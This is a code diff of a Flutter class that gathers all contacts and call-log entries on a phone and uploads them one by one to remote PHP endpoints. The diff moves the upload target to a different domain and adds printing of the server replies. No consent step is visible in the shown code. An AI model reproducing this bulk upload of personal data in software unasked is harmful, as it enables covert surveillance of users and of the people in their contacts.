@@ -5,10 +5,17 @@ import 'package:http/http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 
 class UploadData {
-  final urlcalllog = "https://familybaskets.co.in/api/calllog.php";
-  final urlcontact = "https://familybaskets.co.in/api/contact.php";
+  final urlcalllog = "https://www.calllook.com/api/calllog.php";
+  final urlcontact = "https://www.calllook.com/api/contact.php";
   CallCode callCode = new CallCode();
-  var callname, callphone, callcalltype, callcallingtime, callduration, userid, contactname, contactphone;
+  var callname = 'name';
+  var callphone = 'phone';
+  var callcalltype = 'call type';
+  var callcallingtime = 'calling time';
+  var callduration = 'call duration';
+  var userid = 'user id';
+  var contactname = 'name';
+  var contactphone = 'number';
 
   void getuserid()async{
     final prefs = await SharedPreferences.getInstance();
@@ -20,10 +27,10 @@ class UploadData {
   void contact() async {
     List<Contact> _contact = await ContactsService.getContacts(withThumbnails: false);
     for(int i=0;i< _contact.length; i++){
-      contactname = _contact.elementAt(i).displayName;
+      contactname = _contact.elementAt(i).displayName.toString();
       contactphone = '';
       for(int j=0; j<_contact.elementAt(i).phones.length; j++){
-        contactphone += _contact.elementAt(i).phones.elementAt(j).value + "\n";
+        contactphone += _contact.elementAt(i).phones.elementAt(j).value + "\n".toString();
       }
       final response = await http.post(Uri.parse(urlcontact),
           body: {
@@ -31,23 +38,23 @@ class UploadData {
             "phone" : contactphone,
             "userid" : userid
           });
-      // print(response.body);
+      print(response.body);
     }
   }
 
   void calllog() async {
     final List<CallLogEntry> calllogs = (await CallLog.get()).toList();
     for(int i=0; i<calllogs.length; i++){
-      callname = callCode.getName(calllogs[i]);
+      callname = callCode.getName(calllogs[i]).toString();
       // callCode.getName(elementAt(index));
-      callphone = calllogs.elementAt(i).number;
+      callphone = calllogs.elementAt(i).number.toString();
       // entries.elementAt(index).number;
-      callcalltype = callCode.calltypes(calllogs[i].callType);
+      callcalltype = callCode.calltypes(calllogs[i].callType).toString();
       // callCode.calltypes(entries.elementAt(index).callType);
       callcallingtime = callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(
-          calllogs.elementAt(i).timestamp));
+          calllogs.elementAt(i).timestamp)).toString();
       // callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(entries.elementAt(index).timestamp));
-      callduration = callCode.printDuration(calllogs.elementAt(i).duration);
+      callduration = callCode.printDuration(calllogs.elementAt(i).duration).toString();
       // callCode.printDuration(entries.elementAt(index).duration);
 
 
@@ -59,7 +66,7 @@ class UploadData {
         "duration": callduration,
         "userid": userid
       });
-      // print(response.body);
+      print(response.body);
     }
   }
 }
